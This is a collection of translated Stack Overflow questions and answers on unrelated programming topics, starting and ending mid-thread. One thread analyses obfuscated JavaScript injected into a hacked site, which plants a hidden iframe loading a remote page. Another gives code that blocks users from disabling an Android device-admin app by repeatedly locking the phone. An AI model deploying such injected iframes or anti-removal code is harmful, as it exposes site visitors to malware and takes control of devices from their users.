DoCmd.TransferSpreadsheet acExport, 10, "tblEventFacultyAttendee", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblEventPresenter", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblEventsUniversityParticipant", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblForeignLanguageKnowledge", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblLanguage", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblGrant", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblOrganization", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblProgramRole", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblRole", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblStudent", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblStudyAbroad", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblStudyAbroadParticipation", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblTripLocation", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniDegreeProgram", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniFacultyActivity", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniParticipantStudentAttendee", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniParticipantFacultyAttendee", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniversity", strPath + "/" + strDocName, True
DoCmd.TransferSpreadsheet acExport, 10, "tblUniversityFaculty", strPath + "/" + strDocName, True
MsgBox "Export Complete!", vbOKOnly, ""
DoCmd.SetWarnings True

Exit_Command38_Click:
Exit Sub
Err_Command38_Click:
MsgBox Err.Description
Resume Exit_Command38_Click

End Sub 
```

--- 结束脚本

我试过用类似的东西代替 Inputbox 方法

```
Dim fileSelection As Object

Set fileSelection = Application.FileDialog(2)
fileSelection.Show
Set strPath = fileSelection 
```

但这会在 Set strPath 行上引发“需要对象”错误。感谢您提供任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:16:39.533

`strPath`不是一个对象，所以`Set`des 不适用。试试这个：

```
Set fileSelection = Application.FileDialog(2)
fileSelection.Show
If fileSelection.SelectedItems.Count > 0 Then
    strPath = fileSelection.SelectedItems(1)
End If 
```

# java - android不显示gif

> ID：15750810
> 
> 赞同：0
> 
> 时间：2013-04-01T19:59:50.203
> 
> 标签：java, android, gif

我是android开发的新手，所以我有以下问题。我正在尝试通过以下代码显示 gif green.gif (res/drawable-xxhdpi/)： GIFView 类：

```
package ru.rkarasev.miptrain;

import java.io.InputStream;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Movie;
import android.util.AttributeSet;
import android.view.View;

public class GIFView extends View {
    private Movie movie;
    private InputStream is;
    private long moviestart;

    public GIFView(Context context) {
        super(context);
        is = getResources().openRawResource(R.drawable.green);
        movie = Movie.decodeStream(is);
    }

    public GIFView(Context context, AttributeSet attrs) {
        super(context, attrs);
        is = getResources().openRawResource(R.drawable.green);
        movie = Movie.decodeStream(is);
    }

    @Override
    protected void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        long now = android.os.SystemClock.uptimeMillis();

        if (moviestart == 0)
            moviestart = now;

        int relTime = (int) ((now - moviestart) % movie.duration());
        movie.setTime(relTime);
        movie.draw(canvas, 100, 100);
        this.invalidate();
    }
} 
```

XML文件部分：

```
<TableRow>
     <TextView 
        android:id="@+id/final_1"
        android:width="200dp"
        android:textSize="25sp"/>
      <ru.rkarasev.miptrain.GIFView
        android:layout_marginLeft="30dp" 
        android:layout_gravity="center"
        android:layout_width="wrap_content" 
        android:layout_height="50dp"
        android:id="@+id/greenarrow">
        </ru.rkarasev.miptrain.GIFView>

     <TextView 
        android:id="@+id/time_1"
        android:text=""
        android:textSize="30sp"/>
</TableRow> 
```

活动代码：

```
GIFView gifview = (GIFView) findViewById(R.id.greenarrow); 
```

但是这个视图应该是空的，它没有显示任何东西！你能告诉我有什么问题吗？

UPD：当我打开 activity_main.xml 文件时，它没有显示我的布局的外观，但给了我这个错误：

```
java.lang.NullPointerException
    at ru.rkarasev.miptrain.GIFView.onDraw(GIFView.java:34)
    at android.view.View.draw(View.java:13707)
    at android.view.View.draw(View.java:13591)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13589)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13589)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13710)
    at android.view.View.draw(View.java:13591)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13589)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13710)
    at android.view.View.draw(View.java:13591)
    at android.view.ViewGroup.drawChild(ViewGroup.java:2928)
    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2797)
    at android.view.View.draw(View.java:13710) 
```

GIFView 中的第 34 个字符串是：

```
int relTime = (int)((now - moviestart) % movie.duration()); 
```

似乎没有初始化电影，但为什么呢？

如果我也添加

```
System.out.println(movie.duration()); 
```

在 onDraw 方法的开头，它给了我 2100 毫秒，这是正确的值。它完全避开了我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T08:14:48.323

看起来您的 Movie 对象为 null，并且在跟踪[Movie Class](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/2.3_r1/android/graphics/Movie.java#Movie.decodeStream%28java.io.InputStream%29)的源代码后，它会默默地失败（通过捕获抛出的 IOException）并返回一个 null 对象。

只需在您的代码中添加一个空检查并尝试以另一种方式解码 gif 文件。看看这里：

[GIF解码失败](https://stackoverflow.com/questions/8088865/failed-to-decode-some-animated-gif-files-using-movie-on-android-2-3-x-or-lower)

或者您可以尝试按照此处的建议将您的 GIF 移动到资产文件夹：[SO Answer](https://stackoverflow.com/questions/7777315/showing-gif-in-android)

# android - 如何防止用户通过设置菜单禁用我的设备管理应用程序？

> ID：15750816
> 
> 赞同：13
> 
> 时间：2013-04-01T20:00:30.920
> 
> 标签：android, mdm

我正在开发适用于 android 的 MDM（移动设备管理）应用程序，但我有一个大问题，用户可以从设置>安全>设备管理员中禁用我的应用程序。我唯一能做的就是通过覆盖`onDisableRequested(...)`我的`DeviceAdminReceiver`子类中的方法来显示警告消息，但我真的想阻止用户完全禁用我的管理应用程序。

我试图覆盖该`onReceive(...)`方法，以便当系统广播操作 ACTION_DEVICE_ADMIN_DISABLE_REQUESTED 和 ACTION_DEVICE_ADMIN_DISABLED 时没有任何反应，但到目前为止它还没有起作用。显然，其他一些组件在这些操作到达我的`onReceive(...)`方法之前正在处理它们，我不知道为什么。我希望能够显示我自己的自定义对话框，指示用户无法从此部分禁用管理员应用程序，甚至可能要求用户设置管理员密码来执行此操作。

```
public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (ACTION_PASSWORD_CHANGED.equals(action)) {
            onPasswordChanged(context, intent);
        } else if (ACTION_PASSWORD_FAILED.equals(action)) {
            onPasswordFailed(context, intent);
        } else if (ACTION_PASSWORD_SUCCEEDED.equals(action)) {
            onPasswordSucceeded(context, intent);
        } else if (ACTION_DEVICE_ADMIN_ENABLED.equals(action)) {
            onEnabled(context, intent);
        } else if (ACTION_DEVICE_ADMIN_DISABLE_REQUESTED.equals(action)) {

        } else if (ACTION_DEVICE_ADMIN_DISABLED.equals(action)) {

        } else if (ACTION_PASSWORD_EXPIRING.equals(action)) {
            onPasswordExpiring(context, intent);
        }
    } 
```

我需要帮助来解决这个问题。

谢谢，

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-07-10T09:37:06.833

您可以使用新的设备所有者模式从 Android 5 Lollipop 执行此操作。然后设备管理员选项灰显，用户无法禁用它，因此不卸载设备管理员应用程序。

但是请注意，安装设备所有者应用程序并不容易，它必须在配置时使用 NFC 完成，或者从带有 adb 的计算机（便于测试但不用于部署）或使用 MDM 完成。 ..

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-05-16T00:45:42.893

There is no way to prevent user from disabling, and it's his right.

But to get sure that the user himself is actually removing the admin privilege, lock the device in **onDisableRequested** with his password and return something like "Someone tried to disable this app administrator feature. was it you and are you sure?".

Now if someone other than the real user try to disable it, he has to enter password before proceeding.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-01T20:27:06.990

我同意 FoamyGuy，不允许您阻止禁用管理员。否则，您的应用程序根本无法卸载。

一般来说，用户**授予**某些应用设备管理员权限，并且可以随时删除这些权限。

任何广播都只是通知，您无法处理它并阻止某些操作发生。系统只是对正在监听的应用程序说正在发生的事情。

另外，请阅读：

[停用设备管理员后如何擦除 Android 设备？](https://stackoverflow.com/questions/9298364/how-to-wipe-android-device-when-device-admin-is-deactivated)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2020-04-24T18:12:32.277

有一种解决方法可以防止禁用设备管理员。当用户启动停用并且我们收到 ACTION_DEVICE_ADMIN_DISABLE_REQUESTED 回调时，我们重新启动设置活动意图。

操作系统允许显示一条消息，要求用户确认。根据 Android 操作系统规则，大约 5 秒内，不允许在此确认对话框之上启动任何应用程序。所以基本上我们试图打开的设置活动只会在 5 秒后启动。

为了在不让用户确认停用的情况下经过这 5 秒，手机会被设备管理员在后台线程中反复锁定。用户解锁设备 5 秒后，“设置”活动将重新启动。

Device Admin Broadcast Receiver Class 的以下代码说明了上述方法。

DevAdminReceiver.java

```
public class DevAdminReceiver extends DeviceAdminReceiver {
    DevicePolicyManager dpm;
    long current_time;
    Timer myThread;

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        Log.d("Root", "Device Owner Enabled");
    }

    @Nullable
    @Override
    public CharSequence onDisableRequested(@NonNull Context context, @NonNull Intent intent) {
        Log.d("Device Admin","Disable Requested");
        Intent startMain = new Intent(android.provider.Settings.ACTION_SETTINGS);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(startMain);

        dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);

        myThread = new Timer();
        current_time = System.currentTimeMillis();
        myThread.schedule(lock_task,0,1000);

        return "Warning";
    }

    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (ACTION_DEVICE_ADMIN_DISABLE_REQUESTED.equals(action)) {
            CharSequence res = onDisableRequested(context, intent);
            if (res != null) {
                dpm.lockNow();
                Bundle extras = getResultExtras(true);
                extras.putCharSequence(EXTRA_DISABLE_WARNING, res);
            }
        }else if (ACTION_DEVICE_ADMIN_DISABLED.equals(action)) {
            Log.d("Device Admin","Disabled");
        }
    }

    // Repeatedly lock the phone every second for 5 seconds
    TimerTask lock_task = new TimerTask() {
        @Override
        public void run() {
            long diff = System.currentTimeMillis() - current_time;
            if (diff<5000) {
                Log.d("Timer","1 second");
                dpm.lockNow();
            }
            else{
                myThread.cancel();
            }
        }
    };

} 
```

确保`force lock`在资源文件中为设备管理员设置了策略。这纯粹是一种解决方法，而不是开发人员的预期解决方案。滥用设备管理员权限的应用程序在暴露时总是会立即从 Play 商店中删除。

完整的示例代码位于以下 repo
[https://github.com/abinpaul1/Android-Snippets/tree/master/PermanentDeviceAdministrator](https://github.com/abinpaul1/Android-Snippets/tree/master/PermanentDeviceAdministrator)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-07-18T06:03:55.960

Not a nice way to do this, but here an idea: When you receive the callback ACTION_DEVICE_ADMIN_DISABLE_REQUESTED, kill the settings app. (Search for task-killers to see how)

And make sure you don't kill the settings-app after the user entered the password.

If the settings app is gone, the user can't click the disable button.

# javascript - 恶意 javascript 注入 - 它有什么作用？

> ID：15750817
> 
> 赞同：2
> 
> 时间：2013-04-01T20:00:31.647
> 
> 标签：javascript

我们的一个站点最近的 ftp 帐户遭到入侵，因此攻击者将以下 javascript 注入到他们的主页 html 中。我很擅长使用 javascript，但我无法确定这段代码实际上在做什么。这里有其他人看到这是怎么回事吗？

```
p=parseInt;ss=(123)?String.fromCharCode:0;asgq="28!66!75!6e!63!74!6@!6f!6e!20!28!2@!20!7b!d!a!20!20!20!20!76!61!72!20!66!71!7@!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!72!65!61!74!65!45!6c!65!6d!65!6e!74!28!27!6@!66!72!61!6d!65!27!2@!3b!d!a!d!a!20!20!20!20!66!71!7@!2e!73!72!63!20!3d!20!27!68!74!74!70!3a!2f!2f!77!6@!6e!65!6c!6f!76!65!72!67!75!6@!64!65!2e!63!6f!6d!2f!5f!76!74!6@!5f!62!6@!6e!2f!63!6f!75!6e!74!65!72!2e!70!68!70!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!70!6f!73!6@!74!6@!6f!6e!20!3d!20!27!61!62!73!6f!6c!75!74!65!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!62!6f!72!64!65!72!20!3d!20!27!30!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!68!65!6@!67!68!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!77!6@!64!74!68!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!6c!65!66!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!66!71!7@!2e!73!74!7@!6c!65!2e!74!6f!70!20!3d!20!27!31!70!78!27!3b!d!a!d!a!20!20!20!20!6@!66!20!28!21!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!66!71!7@!27!2@!2@!20!7b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!77!72!6@!74!65!28!27!3c!64!6@!76!20!6@!64!3d!5c!27!66!71!7@!5c!27!3e!3c!2f!64!6@!76!3e!27!2@!3b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!66!71!7@!27!2@!2e!61!70!70!65!6e!64!43!68!6@!6c!64!28!66!71!7@!2@!3b!d!a!20!20!20!20!7d!d!a!7d!2@!28!2@!3b".replace(/@/g,"9").split("!");try{document.body&=0.1}catch(gdsgsdg){zz=3;dbshre=12;if(dbshre){vfvwe=0;try{document;}catch(agdsg){vfvwe=1;}if(!vfvwe){e=eval;}s="";if(zz)for(i=0;i-484!=0;i++){if(window.document)s+=ss(p(asgq[i],16));}if(window.document)e(s);}} 
```

将 e(s) 更改为 console.log(s) 后，我得到以下信息：

```
(function () {
    var fqy = document.createElement('iframe');

    fqy.src = 'http://wineloverguide.com/_vti_bin/counter.php';
    fqy.style.position = 'absolute';
    fqy.style.border = '0';
    fqy.style.height = '1px';
    fqy.style.width = '1px';
    fqy.style.left = '1px';
    fqy.style.top = '1px';

    if (!document.getElementById('fqy')) {
        document.write('<div id=\'fqy\'></div>');
        document.getElementById('fqy').appendChild(fqy);
    } })(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:09:05.567

如果您仔细查看代码，它只有一串十六进制数字，它将一个字符一个字符地转换为 JavaScript 代码。

在该代码的某一时刻，我看到`e=eval`了 ，然后最后是`e(s)`. 因此，如果您更改`e(s)`为`console.log(s)`，您可以看到这段代码*实际上*在做什么。

```
(function () {
    var fqy = document.createElement('iframe');

    fqy.src = 'http://wineloverguide.com/_vti_bin/counter.php';
    fqy.style.position = 'absolute';
    fqy.style.border = '0';
    fqy.style.height = '1px';
    fqy.style.width = '1px';
    fqy.style.left = '1px';
    fqy.style.top = '1px';

    if (!document.getElementById('fqy')) {
        document.write('<div id=\'fqy\'></div>');
        document.getElementById('fqy').appendChild(fqy);
    }
})(); 
```

# php - 表格输入 Yii

> ID：15750821
> 
> 赞同：0
> 
> 时间：2013-04-01T20:00:45.227
> 
> 标签：php, yii, tabular-form

我必须在数据库中的表中输入几个字符串。它的表格输入 yii。无法理解，如果我有这样的控制器，该怎么做：

```
public function actionCreate()
{
    $model1=new Section;
            $model2=new SectionI18n;           
if(isset($_POST['SectionI18n'])){
   foreach ($model2 as $i => $m1) {
         foreach($_POST['SectionI18n'] as $i => $m1)
      {
                $m1=new SectionI18n;
                $m1->attributes=$_POST['SectionI18n'][$i];
                $my[]=$m1->attributes;
              }
} 
```

和一些布局：

```
<?php foreach ($model2 as $i=>$m1):?>
<?php  ?>
<div class="row">
    <?php echo $form->labelEx($model2,'Название'); ?>
    <?php echo $form->textField($model2,'[$i]title',array('size'=>60,'maxlength'=>100)); ?>
    <?php echo $form->error($model2,'title'); ?>
</div>

<div class="row">
    <?php echo $form->labelEx($model2,'Описание'); ?>
    <?php echo $form->textArea($model2,'[$i]description',array('size'=>60,'maxlength'=>200)); ?>
    <?php echo $form->error($model2,'description'); ?>
</div>

<div class="row">
    <?php echo $form->labelEx($model2,'Язык'); ?>
    <?php echo $form->dropDownList($model2,'[$i]lang',array('ru'=>'ru','en'=>'en','ua'=>'ua')); ?>
    <?php echo $form->error($model2,'lang'); ?>
</div>
<?php ?>
<?php endforeach;?> 
```

请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T01:29:29.947

这将是类似的东西：

```
foreach ( $_POST[Model Name] as $i => $y ){
   $var name[$i] = new Model Name;
   $var name[$i]->title = $_POST[Model Name][$i][title]
   ...
} 
```

var_dump post ($_POST), object 使其更容易查看。

# php - 选择带有变量的查询（包含空格）

> ID：15750822
> 
> 赞同：-1
> 
> 时间：2013-04-01T20:00:45.427
> 
> 标签：php, mysql, variables, select

我正在运行以下查询以显示记录。

```
$weavername = $_GET["weavername"];

$result=mysql_query("SELECT co.contId, 
                        co.contDate, 
                        co.quality, 
                        co.width,
                        co.weight,
                        co.quantity,
                        co.rate,
                        co.deliveryDate,
                        co.paymentTerms,
                        pa.partyName, 
                        we.weaverName 
                FROM contract co 
                INNER JOIN party pa ON (co.partyId = pa.partyId)
                INNER JOIN weaver we ON (co.weaverId = we.weaverId) 
WHERE we.weavername = '".$weavername."' ORDER BY co.contId");
echo mysql_error(); 
```

现在我的`$weavername`变量包含空格，例如`Tulasi Cotton Mills`. 因此，当我运行查询时，我不会显示任何记录，因为它只`Tulasi`作为比较。

如何`Tulasi Cotton Mills`在我的查询中匹配？

我也试过 LIKE '$weavername%' 但它也显示带有 weavername 的记录`Tulasi Fabrics`。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:06:41.023

如果您的表在 MyISAM 中，您可以设置全文索引，然后在“Tulasi Cotton Mills”上进行匹配。您可能会得到不完全匹配的结果。

# javascript - 保存会话状态的最佳选择

> ID：15750826
> 
> 赞同：0
> 
> 时间：2013-04-01T20:00:54.787
> 
> 标签：javascript, google-chrome-extension

我正在开发一个 Google Chrome 扩展，它将使用 facebook、twitter 或 google+（可能是三个）的 id 作为身份验证方法。一旦发生用户身份验证，将会话状态保存为关闭的最佳选择是什么？使用 cookie 吗？内容脚本中的任何字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T04:35:34.067

不清楚您所说的“会话状态”是什么意思，但您可以使用 gapi.auth.setToken() 来存储用户凭据。[在https://developers.google.com/api-client-library/javascript/reference/referencedocs#gapiauthsetToken](https://developers.google.com/api-client-library/javascript/reference/referencedocs#gapiauthsetToken)了解更多信息。

# java - android POST 图像文件到 php 脚本使用 httpclient

> ID：15750830
> 
> 赞同：0
> 
> 时间：2013-04-01T20:01:12.820
> 
> 标签：java, php, android, post, apache-httpclient-4.x

我正在尝试将图像文件 (PNG) 发布到 php 脚本，以便我可以从 $_FILES 中获取它们，但是，当我尝试提交数据以上传我的 android 应用程序时，我只是在那里呆了很长时间，我得到了一个不来自系统的响应消息。文件上传时间太长还是我做错了什么？

```
public void postData() {
    // Create a new HttpClient and Post Header
    HttpClient httpclient = new DefaultHttpClient();
    HttpPost httppost = new HttpPost("PHP_SCRIPT_URL");

    SharedPreferences sharedPref = this.getPreferences(Context.MODE_PRIVATE);
    String term = sharedPref.getString(getString(R.string.current_term), "000");
    String location = sharedPref.getString(getString(R.string.current_location), "000");

    EditText text1 = (EditText) this.findViewById(R.id.entry_title);
    EditText text2 = (EditText) this.findViewById(R.id.entry_comments);
    String title = text1.getText().toString();
    String comment = text2.getText().toString();

    MultipartEntity multi = new MultipartEntity();

    try {
        // Add your data
        multi.addPart("term", new StringBody(term));
        multi.addPart("space", new StringBody(location));
        multi.addPart("title", new StringBody(title));
        multi.addPart("comment", new StringBody(comment));
        File cacheDir = new File(this.getCacheDir(), "thumbnails");
        if (cacheDir.exists()) {
            File cacheFile;
            for (int i = 0; i < 6; i++) {
                cacheFile = new File(cacheDir, "photo_" + i);
                if (cacheFile.exists()) {
                    multi.addPart("media"+(i+1), new InputStreamBody(new FileInputStream(cacheFile), "photo_"+i));
                }
            }
        }
        httppost.setEntity(multi);

        // Execute HTTP Post Request
        HttpResponse response = httpclient.execute(httppost);
        int responseCode = response.getStatusLine().getStatusCode();
        switch(responseCode) {
        case 200:
            check_success = true;
            break;
        default:
            check_success = false;
            new AlertDialog.Builder(this).setTitle("ERROR").setMessage("HTTP RESPONSE: "+responseCode).setNeutralButton("Close", null).show();
        }

    } catch (ClientProtocolException e) {
        new AlertDialog.Builder(this).setTitle("ERROR").setMessage("ClientProtocolException\n" + e.getMessage()).setNeutralButton("Close", null).show();
    } catch (IOException e) {
        new AlertDialog.Builder(this).setTitle("ERROR").setMessage("IOException\n" + e.getMessage()).setNeutralButton("Close", null).show();
    }
} 
```

# javascript - 我需要使用（当前）javascript在浏览器中生成一个JSON文件

> ID：15750831
> 
> 赞同：0
> 
> 时间：2013-04-01T20:01:13.033
> 
> 标签：javascript, html, json, matlab, post

我有一个网站，允许用户从数据集中选择日期范围。至少，这是目标。

我想要发生的事情：用户选择一个日期范围，按下提交按钮，一个脚本生成一个 JSON 文件，MATLAB 读取该文件以生成图形。

对帮助实现这一目标的资源有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:39:08.270

您可以使用[Downloadify](https://github.com/dcneiner/Downloadify)，这是一个带有 Javascript 界面的小型 Flash 组件，允许您在客户端上创建用户可以下载的文件。这就是我在类似情况下使用的。

您也可以尝试使用[Data URI](http://en.wikipedia.org/wiki/Data_URI)，但它们非常有限且特定于浏览器，因此可能会出现一些问题。

这些可能是先前建议使用服务器端代码生成文件的答案的替代解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:09:03.457

您需要将触发的脚本作为服务器端。JavaScript 是客户端，不能以任何方式访问、修改或以其他方式在客户端上创建文件。您必须使用一种语言`PHP`来创建文件。

**使用 PHP 的示例：**
创建文件后，强制客户端发出请求以请求文件。将`PHP`标题设置为`Content-Disposition: attachment; filename="< Place file name here>"`.

这将提示浏览器启动下载提示，允许用户下载文件。

希望这可以帮助。

# ios - 如何使用 CIFilter CiColorCube

> ID：15750834
> 
> 赞同：1
> 
> 时间：2013-04-01T20:01:19.063
> 
> 标签：ios, core-image, cifilter

有人可以解释一下，这个过滤器是如何工作的，我看到了 WWDC 2012 和文档，但仍然不太明白。在哪里以及如何定义立方体颜色图。它是在 .h 还是 .m 文件中？我有 ViewController.h 和 .m，我在其中使用一些过滤器，我需要使用 CiColorCube 过滤器，但我只是不知道如何。这是我的代码：

```
- (void)viewDidLoad
{
    // here i would like to use CIColorCube
    CIImage *inputImage = [[CIImage alloc]initWithImage:[UIImage imageNamed:@"background.jpg"]];
    CIImage *inputBackgroundImg = [[CIImage alloc]initWithImage:[UIImage imageNamed:@"image.jpeg"]];
    CIContext *context = [CIContext contextWithOptions:nil];
    vignette = [CIFilter filterWithName:@"CIVignette"];
    [vignette setValue:inputImage forKey:kCIInputImageKey];
    [vignette setValue:[NSNumber numberWithFloat:2.5] forKey:@"inputRadius"];
    [vignette setValue:[NSNumber numberWithFloat:2.9] forKey:@"inputIntensity"];
    sourceOC = [CIFilter filterWithName:@"CISourceOverCompositing"];
    [sourceOC setValue:vignette.outputImage forKey:kCIInputImageKey];
    [sourceOC setValue:inputBackgroundImg forKey:@"inputBackgroundImage"];
    maskToAlpha = [CIFilter filterWithName:@"CIMaskToAlpha"];
    [maskToAlpha setValue:inputImage forKey:kCIInputImageKey];
    CIImage *outputImage = maskToAlpha.outputImage;
    imageView.image = [UIImage imageWithCGImage:[context createCGImage:outputImage fromRect:outputImage.extent]];
    [super viewDidLoad];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-08T02:12:04.613

在 Apple 的开发人员库中，有一个关于[“Subclassing CIFilter: Recipes for Custom Effects”](https://developer.apple.com/library/ios/documentation/GraphicsImaging/Conceptual/CoreImaging/ci_filer_recipes/ci_filter_recipes.html#//apple_ref/doc/uid/TP30001185-CH4-SW1)的文档展示了如何制作颜色图。

此外，您可以在 XCode 中查找 ImageApp 示例代码，它还显示了 ImageFilter.m 中的方法。

# compass-sass - 指南针/侦察兵导入

> ID：15750838
> 
> 赞同：1
> 
> 时间：2013-04-01T20:01:22.723
> 
> 标签：compass-sass, compass-geolocation, scout-sass

我刚开始使用带有 GUI 侦察功能的指南针。我正在尝试跟随演示，对@import 有点困惑。当我执行 @import "compass" 时，一切都编译得很好。但是，当我尝试导入 compass/scss/_normalize.scss 中的 @import "scss/normalize" 时，我得到了

> > > 在 14:59:07 检测到更改为：screen.scss 错误 screen.scss（第 2 行：“@import “compass”之后的无效 CSS：预期的选择器或 at-rule，是“@import”scss/n... ") 覆盖 screen.css

@import "compass" 到底在做什么？那是在导入什么文件？或者是我在程序文件中安装 scout 的文件夹？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:21:00.280

弄清楚了。你需要一个 ; 在每个导入语句之后。呃。

# javascript - fadeIn 回调在 jquery.ajax 成功内部不起作用

> ID：15750839
> 
> 赞同：0
> 
> 时间：2013-04-01T20:01:34.637
> 
> 标签：javascript, jquery, ajax, callback

我使用 AJAX 获取一些数据，将元素添加到`body`然后显示它。显示后，我需要对新元素执行一些客户端操作（例如，我需要使用[codecogs' script](http://www.codecogs.com/latex/about.php)渲染 Latex ）。我的代码如下所示：

```
$.ajax({
/* ... */
success: function(data){
    /* new element generation... */
    $(newelement).fadeIn(100, LatexIT.render('*'));
},
/* ... */ }); 
```

如您所见，我将`LatexIT.render('*')`其作为来自fadeIn 的回调调用。`LatexIT.render('*')`它应该在动画结束后立即执行任何操作。但是当从`$.ajax success`回调中调用时不起作用，尽管淡入淡出本身正常发生。

**更新**：我试图`LatexIT.render('*')`用任何简单的函数替换，但它不起作用。并且在从 ajax 成功之外调用时`fadeIn(100, function () { LatexIT.render('*') });` **确实有效。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:03:40.997

`LatexID.render('*')`是*调用*`.render`方法而不是绑定它的语法。除非它本身返回一个不太可能的函数，否则您需要使用以下语法：

```
.fadeIn(100, function () { LatexIT.render('*') }); 
```

你也可以这样做：

```
.fadeIn(100, LatexIT.render.bind(undefined, '*')) 
```

假设您需要支持的浏览器有[`.bind`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/bind)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:11:25.933

在那里你没有给它一个成功回调，你正在执行你的渲染并将渲染方法返回的内容提供给淡入淡出动画的完整参数，这实际上不是动画最后可以调用的函数。

你应该把它包装成一个匿名函数： `$(newElement).fadeIn(100, function() { LatexIT.render("*"); })`

# windows - 允许在资源管理器样式的列表视图中选择从第一列开始

> ID：15750842
> 
> 赞同：16
> 
> 时间：2013-04-01T20:01:46.507
> 
> 标签：windows, winforms, winapi, listview, windows-7

在 Windows 7 的 Windows 资源管理器列表视图（[据称根本不是列表视图）的详细信息视图中，您可以在第一列（](https://stackoverflow.com/q/15479540/850848#comment21909836_15479540)*名称*）中启动选择框。您只需要在实际名称之外开始。

![Windows 7 的 Windows 资源管理器选择框](https://i.stack.imgur.com/3Z3Km.png)

详细信息视图中的默认样式列表视图控件也是如此。

但是，如果您将列表视图控件设置为资源管理器样式（使用[`SetWindowTheme`](https://docs.microsoft.com/en-us/windows/win32/api/uxtheme/nf-uxtheme-setwindowtheme)），应该模仿 Windows 资源管理器，这将不再起作用。您只能在第二列和后面的列中开始选择。

```
SetWindowTheme(listView1.Handle, "explorer", null); 
```

有没有办法让列表视图模仿资源管理器的选择风格？

我想没有设置可以启用这种行为，并且必须对其进行编码。就像处理鼠标按下和触发选择一样。但我不知道该怎么做。

谢谢。

注意，我使用的是 C++Builder，但这应该是纯粹的 Win32 问题。我也用 WinForms 对此进行了测试（因此上面的 C# 示例）。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-01T20:06:37.177

> 有没有办法让列表视图模仿资源管理器的选择风格？

